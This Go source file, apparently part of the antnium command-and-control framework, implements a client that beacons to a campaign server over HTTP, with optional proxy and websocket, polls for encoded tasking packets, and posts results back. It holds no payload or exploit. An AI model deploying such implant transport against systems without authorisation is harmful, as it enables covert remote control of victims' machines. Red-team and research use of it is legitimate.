package client

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"time"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

type UpstreamHttp struct {
	channel chan model.Packet

	state ClientState
	coder model.Coder

	config   *ClientConfig
	campaign *model.Campaign

	notifier WebsocketNotifier
}

func MakeUpstreamHttp(config *ClientConfig, campaign *model.Campaign) UpstreamHttp {
	coder := model.MakeCoder(campaign)
	notifier := MakeWebsocketNotifier(config, campaign)

	u := UpstreamHttp{
		make(chan model.Packet),
		MakeClientState(),
		coder,
		config,
		campaign,
		notifier,
	}
	return u
}

func (d *UpstreamHttp) Connect() error {
	proxyUrl, ok := getProxy(d.campaign)
	if ok {
		if proxyUrl, err := url.Parse(proxyUrl); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
			proxyUrlFunc := http.ProxyURL(proxyUrl)
			http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
			log.Infof("Using proxy: %s", proxyUrl)
		} else {
			log.Warnf("Could not parse proxy %s: %s", proxyUrl, err.Error())
		}
	}

	if d.campaign.ClientUseWebsocket {
		log.Info("UpstreamHttp: Use WS")
		err := d.notifier.Connect()
		if err != nil {
			log.Warn(err.Error())
		}
	}

	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	packet := model.NewPacket("ping", d.config.ComputerId, "0", arguments, response)
	err := d.SendOutofband(packet)
	if err != nil {
		log.Warnf("Initial test ping: Could not reach server %s (yet, i keep trying...)", d.campaign.ServerUrl)
	}

	return nil
}

func (d *UpstreamHttp) Channel() chan model.Packet {
	return d.channel
}

func (d *UpstreamHttp) SendOutofband(packet model.Packet) error {
	// Only used for client-initiated packets
	return d.sendPacket(packet)
}

// Start is a Thread responsible for receiving packets from server, lifetime:app
func (d *UpstreamHttp) Start() {
	for {
		// If the websocket is connected, it will notify us of new packets (it blocks).
		// If not, try regularly
		if d.campaign.ClientUseWebsocket && d.notifier.IsConnected() {
			<-d.notifier.channel
		} else {
			time.Sleep(d.state.getSleepDuration())
		}

		// Try getting a packet from server
		packet, err := d.GetPacket()
		if err != nil {
			if err == ErrNoPacketsFound {
				fmt.Print(".")

				if d.campaign.ClientUseWebsocket && d.notifier.IsConnected() {
					log.Error("WS notified us about new packet, but there wasnt one")
				}
				continue // no packets for us, maybe later
			}

			log.WithFields(log.Fields{
				"error": err,
			}).Debug("Error get packet")

			// Sleep and try again
			continue
		}

		// Notify state that we received a packet
		d.state.gotPacket()

		// Send it to Client
		d.channel <- packet

		// Receive answer from Client
		packet = <-d.channel

		// Send answer back to server
		err = d.sendPacket(packet)
		if err != nil {
			log.WithFields(log.Fields{
				"packet": packet,
				"error":  err,
			}).Info("Error sending packet")
		}
	}
}

func (d *UpstreamHttp) GetPacket() (model.Packet, error) {
	url := d.PacketGetUrl()
	resp, err := d.HttpGet(url)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return model.Packet{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
	}

	if len(bodyBytes) <= 0 {
		return model.Packet{}, ErrNoPacketsFound
	}
	packet, err := d.coder.DecodeData(bodyBytes)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
	}
	return packet, nil
}

func (d *UpstreamHttp) sendPacket(packet model.Packet) error {
	url := d.PacketSendUrl()

	// Setup response
	packet.ComputerId = d.config.ComputerId
	packet.PacketId = strconv.Itoa(int(rand.Uint64()))

	log.WithFields(log.Fields{
		"computerId":   packet.ComputerId,
		"packetId":     packet.PacketId,
		"downstreamId": packet.DownstreamId,
		"packetType":   packet.PacketType,
		"argumetns":    packet.Arguments,
	}).Info("Send to Server")

	data, err := d.coder.EncodeData(packet)
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}

	resp, err := d.HttpPost(url, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}

	return nil
}
